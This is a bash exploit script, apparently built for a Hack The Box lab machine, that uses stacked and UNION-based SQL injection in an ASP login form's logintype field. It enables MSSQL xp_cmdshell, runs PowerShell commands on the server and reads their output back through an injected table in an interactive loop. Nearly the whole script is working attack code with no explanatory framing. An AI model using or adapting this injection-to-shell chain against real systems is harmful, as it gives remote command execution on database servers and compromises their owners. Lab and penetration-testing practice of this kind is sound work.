#!/bin/bash
#
trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    dropTable
    exit 1
}
main_url="http://members.streetfighterclub.htb/old/verify.asp"

#enable advanced options
#curl -s -X POST "$main_url" \
#  --data-urlencode "logintype=2;exec sp_configure 'show advanced options', 1;-- -" \
#  --data "username=admin" \
#  --data "password=admin" \
#  --data "rememberme=ON" \
#  --data "B1=LogIn"

#sleep 2
# enable xp_cmdshell
#curl -s -X POST "$main_url" \
#  --data-urlencode "logintype=2;exec sp_configure 'Xp_cMdShEll', 1;-- -" \
#  --data "username=admin" \
#  --data "password=admin" \
#  --data "rememberme=ON" \
#  --data "B1=LogIn"


function Create_Table {
  
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn" > /dev/null 
}

function Truncate_Table {
  
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;truncate table rce;-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  > /dev/null 
}

function Execute_Command {
  command="$1"
  powershell="C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell $command"
  curl -s -X POST "$main_url" \
    --data-urlencode "logintype=2;insert into rce(output) exec Xp_cMdShEll '$powershell';-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn" > /dev/null 


  topIdCounter=$(curl -i -s -X POST "$main_url" \
  --data-urlencode "logintype=2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  
)
  TopIdCounter_decode=$(echo "$topIdCounter" | grep -o "Email=.*;" | cut -d '=' -f 2 | cut -d ';' -f 1 | sed 's/%3D/=/g' | base64 -d; echo)
 
  for ((i = 1; i < TopIdCounter_decode; i++)); do
    output=$(curl -i -s -X POST "$main_url" \
    --data-urlencode "logintype=2 union select 1,2,3,4,(select output from rce where id=$i),6-- -" \
    --data "username=admin" \
    --data "password=admin" \
    --data "rememberme=ON" \
    --data "B1=LogIn"  
    )
  echo "$output" | grep -o "Email=.*;" | cut -d '=' -f 2 | cut -d ';' -f 1 | sed 's/%3D/=/g' | base64 -d; echo                   

  done
  
  Truncate_Table
}


function dropTable
{
  curl -s -X POST "$main_url" \
  --data-urlencode "logintype=2;drop table rce;-- -" \
  --data "username=admin" \
  --data "password=admin" \
  --data "rememberme=ON" \
  --data "B1=LogIn"  > /dev/null
}

Create_Table
while true; do 
  read -p "> " command
  Execute_Command "$command"

done
